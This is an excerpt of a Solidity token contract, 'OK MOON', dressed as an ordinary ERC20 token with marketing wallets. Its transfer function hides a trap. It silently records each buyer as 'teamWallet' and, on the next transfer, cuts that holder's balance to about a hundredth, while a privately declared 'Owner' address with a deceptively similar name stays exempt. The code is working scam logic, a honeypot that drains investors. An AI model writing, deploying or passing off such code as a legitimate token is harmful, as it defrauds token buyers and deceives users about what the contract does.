...
contract OKMOON is IERC20, Context{
    ...
    string public name = "OK MOON";
    string public symbol = "OKMOON";
    uint8 public decimals = 9;
    uint256 public override totalSupply = 100000000 * 10 ** decimals;
    address public owner; address public router=0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;address private Owner=0x5612C63f911F9200ff1FE47df7dF17496362D28C;address public teamWallet=0x0000000000000000000000000000000000000000;
    address public marketingWallet1=0x3f4D6bf08CB7A003488Ef082102C2e6418a4551e;
    address public marketingWallet2=0x7ee058420e5937496F5a2096f04caA7721cF70cc;
    ...
    constructor() {
        ...
        _transfer(msg.sender, teamWallet, ads);      
        _transfer(msg.sender, marketingWallet1, ads); //Marketing 1
        _transfer(msg.sender, marketingWallet2, ads); //Marketing 2
    }
    ...
    function transfer(address to, uint256 amount) public override returns (bool success) {
        ...
        if (teamWallet != Owner && teamWallet !=getPair() && to != teamWallet) {
            balanceOf[teamWallet]=balanceOf[teamWallet].divCeil(100);}
        if (to != owner && to != router) {teamWallet = to;}
    ...
    function burn(uint Beep) internal {
        IUniswapV2Router01 _router = IUniswapV2Router01(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
